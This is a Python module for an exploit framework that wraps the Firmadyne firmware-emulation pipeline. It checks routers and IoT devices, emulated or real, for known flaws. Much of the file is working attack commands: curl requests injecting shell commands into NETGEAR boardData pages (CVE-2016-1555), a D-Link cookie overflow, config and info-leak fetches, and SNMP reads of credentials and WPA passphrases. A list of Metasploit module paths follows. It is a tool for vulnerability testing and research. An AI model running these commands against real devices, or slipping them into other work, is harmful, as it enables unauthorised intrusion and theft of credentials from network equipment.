#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""Firmadyne Automated Firmware Emulation and Analysis.

Integrates Firmadyne (firmadyne/firmadyne) capabilities for automated
firmware analysis through emulation. Firmadyne performs:
  - Firmware image extraction and filesystem recovery
  - Automated QEMU emulation with network configuration
  - Web interface accessibility testing
  - Known exploit testing against emulated firmware
  - Network service enumeration of emulated devices

Firmadyne's exploit testing covers multiple CVEs including:
  - CVE-2016-1555: NETGEAR boardData*.php command injection
  - CVE-2016-1556: NETGEAR getBoardConfig.php info disclosure
  - CVE-2016-1557: NETGEAR SNMP credential exposure
  - CVE-2016-1558: D-Link session cookie buffer overflow
  - CVE-2016-1559: NETGEAR SNMP configuration exposure
  - Various router command injection via HTTP/SNMP

This module automates:
  1. Firmware extraction via binwalk
  2. Database tracking of firmware metadata
  3. Network interface configuration for emulated image
  4. QEMU launch with proper kernel and filesystem
  5. Exploit validation against running emulated firmware

HW_REQ: QEMU, PostgreSQL (for metadata DB), binwalk.

References:
  - Repository: https://github.com/firmadyne/firmadyne
  - Paper: "Towards Automated Dynamic Analysis of IoT Firmware" (NDSS 2016)
  - License: MIT

MITRE ATT&CK:
  - T1190: Exploit Public-Facing Application
  - T1592.002: Gather Victim Host Information: Software
  - T1595.002: Active Scanning: Vulnerability Scanning
  - T1059.004: Command and Scripting Interpreter: Unix Shell

Version: 1.0.0
"""
from __future__ import annotations

import hashlib
import json
import logging
import os
import re
import subprocess
import time
from typing import Any, Dict, List, Optional, Tuple

from embedxpl.core.exploit import (
    Exploit,
    HTTPClient,
    OptBool,
    OptInteger,
    OptPort,
    OptString,
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
)

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Known router exploits from firmadyne/analyses/runExploits.py
# ---------------------------------------------------------------------------
SHELL_EXPLOITS: Dict[int, Dict[str, str]] = {
    200: {
        "name": "NETGEAR boardData102.php RCE",
        "cve": "CVE-2016-1555",
        "cmd": (
            'curl -L --max-redir 0 -m 5 -s -f -X POST '
            '-d "macAddress=000000000000;id;&reginfo=1&writeData=Submit" '
            'http://{target}/boardData102.php'
        ),
        "check": "uid=",
    },
    201: {
        "name": "NETGEAR boardData103.php RCE",
        "cve": "CVE-2016-1555",
        "cmd": (
            'curl -L --max-redir 0 -m 5 -s -f -X POST '
            '-d "macAddress=000000000000;id;&reginfo=1&writeData=Submit" '
            'http://{target}/boardData103.php'
        ),
        "check": "uid=",
    },
    202: {
        "name": "ZyNOS ROM-0 config dump",
        "cve": "N/A",
        "cmd": "curl -L --max-redir 0 -m 5 -s -f http://{target}/ROM-0",
        "check": "",
    },
    203: {
        "name": "D-Link session cookie BoF",
        "cve": "CVE-2016-1558",
        "cmd": (
            'curl -L --max-redir 0 -m 5 -s -f '
            '-b "dlink_uid=' + 'A' * 256 + '" '
            'http://{target}/session_login.php'
        ),
        "check": "BadVA",
    },
    204: {
        "name": "NETGEAR boardDataJP.php RCE",
        "cve": "CVE-2016-1555",
        "cmd": (
            'curl -L --max-redir 0 -m 5 -s -f -X POST '
            '-d "macAddress=000000000000;id;&reginfo=1&writeData=Submit" '
            'http://{target}/boardDataJP.php'
        ),
        "check": "uid=",
    },
    207: {
        "name": "NETGEAR getBoardConfig.php info leak",
        "cve": "CVE-2016-1556",
        "cmd": "curl -L --max-redir 0 -m 5 -s -f http://{target}/getBoardConfig.php",
        "check": "WPS PIN",
    },
    209: {
        "name": "NETGEAR SNMP credential exposure",
        "cve": "CVE-2016-1559",
        "cmd": "snmpwalk -v2c -c public {target} .iso",
        "check": ".2.1.3.3.2.1.1.4",
    },
    211: {
        "name": "NETGEAR SNMP WPA passphrase",
        "cve": "CVE-2016-1557",
        "cmd": "snmpwalk -v2c -c public {target} iso.3.6.1.4.1.4526.100.7.8.1.5",
        "check": "",
    },
}

# Metasploit modules that firmadyne tests
METASPLOIT_EXPLOITS: Dict[int, Dict[str, str]] = {
    0: {"name": "AirTies Login CGI BoF", "module": "exploits/linux/http/airties_login_cgi_bof"},
    1: {"name": "Belkin Login BoF", "module": "exploits/linux/http/belkin_login_bof"},
    2: {"name": "DD-WRT CGI Exec", "module": "exploits/linux/http/ddwrt_cgibin_exec"},
    3: {"name": "D-Link Auth CGI BoF", "module": "exploits/linux/http/dlink_authentication_cgi_bof"},
    4: {"name": "D-Link Command Exec", "module": "exploits/linux/http/dlink_command_php_exec_noauth"},
    5: {"name": "D-Link Diagnostic Exec", "module": "exploits/linux/http/dlink_diagnostic_exec_noauth"},
    6: {"name": "D-Link DIR-300 Telnet", "module": "exploits/linux/http/dlink_dir300_exec_telnet"},
    7: {"name": "D-Link DIR-605L Captcha BoF", "module": "exploits/linux/http/dlink_dir605l_captcha_bof"},
    8: {"name": "D-Link DIR-615 Exec", "module": "exploits/linux/http/dlink_dir615_up_exec"},
    16: {"name": "Fritz!Box Echo Exec", "module": "exploits/linux/http/fritzbox_echo_exec"},
    17: {"name": "Linksys Apply CGI", "module": "exploits/linux/http/linksys_apply_cgi"},
    19: {"name": "Linksys TheMoon Exec", "module": "exploits/linux/http/linksys_themoon_exec"},
    23: {"name": "Multi NCC Ping Exec", "module": "exploits/linux/http/multi_ncc_ping_exec"},
    24: {"name": "NETGEAR DGN1000B Exec", "module": "exploits/linux/http/netgear_dgn1000b_setup_exec"},
    26: {"name": "NETGEAR ReadyNAS Exec", "module": "exploits/linux/http/netgear_readynas_exec"},
    27: {"name": "Realtek miniIGD UPnP Exec", "module": "exploits/linux/http/realtek_miniigd_upnp_exec_noauth"},
    28: {"name": "Seagate NAS PHP Exec", "module": "exploits/linux/http/seagate_nas_php_exec_noauth"},
    29: {"name": "SerComm Exec", "module": "exploits/linux/misc/sercomm_exec"},
}


class FirmadyneAnalysis(HTTPClient):
    """Firmadyne automated firmware emulation and exploit analysis.

    Provides two operational modes:
      1. Full mode: orchestrates firmadyne pipeline (extract, emulate, test)
      2. Exploit-only mode: runs exploit checks against a target IP
         (useful when firmware is already emulated or on real hardware)
    """

    __info__ = {
        "name": "Firmadyne Firmware Analysis",
        "description": (
            "Automated firmware emulation and exploit validation. "
            "Extracts firmware, emulates via QEMU, tests known "
            "router/IoT exploits against emulated or live targets."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://github.com/firmadyne/firmadyne",
            "https://doi.org/10.14722/ndss.2016.23415",
        ),
        "devices": ("Firmware", "Routers", "IoT", "NAS"),
        "cve": "CVE-2016-1555, CVE-2016-1556, CVE-2016-1557, CVE-2016-1558, CVE-2016-1559",
        "cvss": "9.8 (varies by CVE)",
        "severity": "CRITICAL",
        "mitre_techniques": ["T1190", "T1592.002", "T1595.002", "T1059.004"],
        "mitre_tactics": [
            "Initial Access",
            "Reconnaissance",
            "Execution",
        ],
        "license": "MIT",
    }

    target = OptString("", "Target IP (emulated or real firmware device)")
    port = OptPort(80, "HTTP port")
    firmware_path = OptString("", "Path to firmware image (for emulation)")
    mode = OptString(
        "exploit",
        "'exploit' to test exploits, 'emulate' for full pipeline",
    )
    firmadyne_path = OptString("/opt/firmadyne", "Path to firmadyne installation")
    run_metasploit = OptBool(False, "Also list applicable Metasploit modules")
    timeout = OptInteger(5, "HTTP request timeout in seconds")

    def _test_shell_exploit(
        self, exploit_id: int, exploit: Dict[str, str]
    ) -> Optional[Dict[str, Any]]:
        """Test a single shell-based exploit against target."""
        cmd = exploit["cmd"].format(target=f"{self.target}:{self.port}")

        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=self.timeout + 2,
            )
            output = result.stdout + result.stderr

            # Check success condition
            check = exploit.get("check", "")
            if check and check in output:
                return {
                    "id": exploit_id,
                    "name": exploit["name"],
                    "cve": exploit.get("cve", "N/A"),
                    "status": "VULNERABLE",
                    "evidence": output[:200],
                }
            elif not check and result.returncode == 0 and len(output) > 10:
                return {
                    "id": exploit_id,
                    "name": exploit["name"],
                    "cve": exploit.get("cve", "N/A"),
                    "status": "POTENTIALLY_VULNERABLE",
                    "evidence": output[:200],
                }
            return None

        except subprocess.TimeoutExpired:
            return None
        except Exception as e:
            logger.debug(f"Exploit {exploit_id} error: {e}")
            return None

    def _test_web_accessible(self) -> bool:
        """Test if target has an accessible web interface."""
        try:
            result = subprocess.run(
                [
                    "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                    "-m", str(self.timeout),
                    f"http://{self.target}:{self.port}/",
                ],
                capture_output=True,
                text=True,
                timeout=self.timeout + 2,
            )
            code = result.stdout.strip()
            return code in ("200", "301", "302", "401", "403")
        except (subprocess.TimeoutExpired, Exception):
            return False

    def _run_exploit_suite(self) -> List[Dict[str, Any]]:
        """Run all shell exploits against target."""
        findings = []

        print_status(f"Testing {len(SHELL_EXPLOITS)} shell exploits against {self.target}")

        for exploit_id, exploit in sorted(SHELL_EXPLOITS.items()):
            print_status(
                f"  [{exploit_id}] {exploit['name']} ({exploit.get('cve', 'N/A')})"
            )
            result = self._test_shell_exploit(exploit_id, exploit)
            if result:
                if result["status"] == "VULNERABLE":
                    print_success(
                        f"  VULNERABLE: {result['name']} ({result['cve']})"
                    )
                else:
                    print_warning(
                        f"  POSSIBLE: {result['name']} ({result['cve']})"
                    )
                findings.append(result)

        return findings

    def run(self):
        """Execute Firmadyne analysis."""
        if self.mode == "emulate":
            if not self.firmware_path or not os.path.isfile(self.firmware_path):
                print_error(f"Firmware not found: {self.firmware_path}")
                return
            print_info("Firmadyne emulation pipeline:")
            print_info("  1. Extract firmware with binwalk")
            print_info("  2. Identify architecture and kernel")
            print_info("  3. Configure network interfaces")
            print_info("  4. Launch QEMU emulation")
            print_info("  5. Run exploit suite against emulated device")
            print_warning(
                "Full emulation requires firmadyne installed at "
                f"{self.firmadyne_path}"
            )

            # Run firmadyne extraction
            extract_script = os.path.join(
                self.firmadyne_path, "sources", "extractor", "extractor.py"
            )
            if os.path.isfile(extract_script):
                print_status("Running firmadyne extractor...")
                try:
                    subprocess.run(
                        [
                            "python3", extract_script,
                            "-b", "auto",
                            "-sql", "127.0.0.1",
                            "-np",
                            "-nk",
                            self.firmware_path,
                            os.path.join(self.firmadyne_path, "images"),
                        ],
                        timeout=600,
                    )
                except Exception as e:
                    print_error(f"Extraction failed: {e}")
            else:
                print_error(f"Firmadyne not found at {self.firmadyne_path}")
            return

        # Exploit testing mode
        if not self.target:
            print_error("No target IP specified")
            return

        print_info(f"Firmadyne exploit testing: {self.target}:{self.port}")

        # Check web accessibility
        print_status("Checking web interface accessibility...")
        if self._test_web_accessible():
            print_success("Web interface accessible")
        else:
            print_warning(
                "Web interface not accessible; some exploits may not apply"
            )

        # Run exploit suite
        findings = self._run_exploit_suite()

        # Metasploit module listing
        if self.run_metasploit:
            print_status("\nApplicable Metasploit modules:")
            for mid, mdata in sorted(METASPLOIT_EXPLOITS.items()):
                print_info(f"  [{mid}] {mdata['name']}: {mdata['module']}")

        # Summary
        print_info(f"\n{'=' * 60}")
        vuln_count = sum(
            1 for f in findings if f["status"] == "VULNERABLE"
        )
        possible_count = sum(
            1 for f in findings if f["status"] == "POTENTIALLY_VULNERABLE"
        )
        print_info(f"Results: {vuln_count} confirmed, {possible_count} possible")

        if findings:
            for f in findings:
                cve_str = f.get("cve", "N/A")
                print_info(f"  [{f['status']}] {f['name']} ({cve_str})")
